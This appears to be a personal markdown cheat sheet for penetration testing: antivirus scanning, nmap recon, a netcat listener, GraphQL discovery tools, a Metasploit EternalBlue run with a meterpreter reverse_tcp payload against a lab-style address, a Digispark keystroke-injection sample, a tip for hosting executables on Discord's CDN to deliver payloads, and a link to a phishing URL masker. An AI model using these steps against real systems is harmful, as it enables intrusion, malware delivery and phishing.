# Security

## ClamAV

### Setup

- Download & Install
- copy clamd.conf & freshclam.conf to installation folder and comment out `# Example` line in each file
- open powershell in admin -> `./freshclam.exe`;

### Scan

```bash
# -i display infected files
# -r recursively scan subdirectories
# --log output file for results
./clamscan C:\Users\myuser -r -i --log=scanresult.txt
```

[ClamAV Docs](https://docs.clamav.net/Introduction.html)

## Cloud

Start a docker ParrotOS cloud container

```bash
docker run --name psec1 -ti parrot.run/security
docker start psec1
```

Return to an existing container

```bash
docker exec -ti psec1 bash
```

Other helpful commands

```bash
docker ps -a // list container
docker stop psec1 // stop container
docker rm psec1 // remove container
```

Available ParrotOS containers

```
- parrot.run/core
- parrot.run/security
- parrot.run/nmap (nmap, ncat, ndiff, dnsutils, netcat, telnet)
- parrot.run/metasploit (metasploit, postgresql, nmap)
- parrot.run/set (set)
- parrot.run/beef (beef-xss)
- parrot.run/bettercap (bettercap)
- parrot.run/sqlmap (sqlmap)
```

## Recon

### Ping

```bash
ping <ip>

# Pinging [ip] with 32 bytes of data:
# Reply from <ip>: bytes=32 time=25ms TTL=(128 for windows, 64 for windows)
```

### Nmap

#### Initial discovery

```bash
# -sC default scripts
# -sV probe open ports
# -Pn skip host discovery
# -oA output in three major formats
# -sn ping scan
# -A aggresive
nmap -sC -sV -A -Pn <ip>
```

#### Vulnerability analysis

```bash
ls /usr/share/nmap/scripts/ | grep smb
nmap --script smb* -p 139 <ip>
```

### NetCat

```bash
# nc <options> <port>
nc -lnvp 443 # start netcat listener on port 443
```

### GraphQL

#### Cheat Sheet

[graphql vulnerabilities](https://0xn3va.gitbook.io/cheat-sheets/web-application/graphql-vulnerabilities)

#### GraphQLmap

Provides options for gathering schema, fuzzing, and injection
Basic usage

```bash
git clone https://github.com/swisskyrepo/GraphQLmap
python setup.py install
graphqlmap -u <target>
graphqlmap > dump_new
```

#### Clairvoyance

Gathers GraphQL schema from wordlist using discovery methodology on apis with introspection disabled

```bash
pip install clairvoyance
clairvoyance <target>
```

```bash
# -o schema.json  -- file to output to
# -w wordlist.txt -- wordlist file (optional)
# --profile slow -- set speed to slow or fast for rate limiters
# --progress -- reports progress back to user
clairvoyance <target> -o schema.json -w wordlist.txt --profile slow --progress
```

Load the output json into [graphql schema viewer](https://ivangoncharov.github.io/graphql-voyager)

## Exploit

### Searchsploit

Installation

```bash
sudo git clone https://gitlab.com/exploit-database/exploitdb /opt/exploitdb
sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
```

Use

```bash
searchsploit eternal
```

### Metasploit

```bash
# example eternal blue
msfconsole-start
search eternalblue
options
set rhosts 10.10.10.40
set payload windows/x64/meterpreter/reverse_tcp
use exploit/windows/smb/ms17_010_eternalblue
set lhost 10.10.14.10
set lport 4321
sysinfo
```

### Running a manual exploit

```bash
sudo git clone https://github.com/:user/:package.git
cd package
pip install -r requirements.txt
```

### SQL Injection

#### Damn Small SQLi Scanner

```bash
sudo git clone https://github.com/stamparm/DSSS.git
cd DSSS
python3 dsss.py -u "<target>"
```

## General Tips

### Easily deploy an exe

- Upload to discord
- Copy cdn path
- Use with beef-xss or anywhere else to deliver payload

### Digispark

#### Sample Script

```cpp
#include "DigiKeyboard.h"

void setup() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // WIN + R
DigiKeyboard.println("chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ"); // Open chrome with funny video
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(600);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_F11); // Fullscreen browser
DigiKeyboard.delay(1200);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_F); // Fullscreen video
}
```

[convert duckyscript to c++](https://github.com/CedArctic/digiQuack)
[DigiSpark-Scripts](https://github.com/CedArctic/DigiSpark-Scripts)
[Additional scripts](https://github.com/MTK911/Attiny85)
[Flashsploit](https://github.com/thewhiteh4t/flashsploit)
[hak5rubberducky scripts](https://github.com/hak5/usbrubberducky-payloads)
[WiFi Duck](https://github.com/SpacehuhnTech/WiFiDuck)
[Python on a chip](https://github.com/jsnyder/python-on-a-chip)

### Online tools

[request catcher](https://requestcatcher.com)
[web hooks](https://webhook.site)
[graphql schema viewer](https://ivangoncharov.github.io/graphql-voyager)

### Resources

[hacktricks](book.hacktricks.xyz)
[intruder payloads](https://github.com/1N3/IntruderPayloads)
[url masker](https://github.com/jaykali/maskphish)
[mgeeky pentest tools](https://github.com/mgeeky/Penetration-Testing-Tools)
[openvas vulnerability scanner](https://github.com/greenbone/openvas-scanner)
[swisskyrepo payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)
[ports list](https://github.com/maraisr/ports-list)
[clairvoyance graphql](https://github.com/nikitastupin/clairvoyance)
[graphql map](https://github.com/swisskyrepo/GraphQLmap)
[cheat sheet](https://0xn3va.gitbook.io/cheat-sheets/)
[exploitdb](https://gitlab.com/exploit-database/exploitdb)
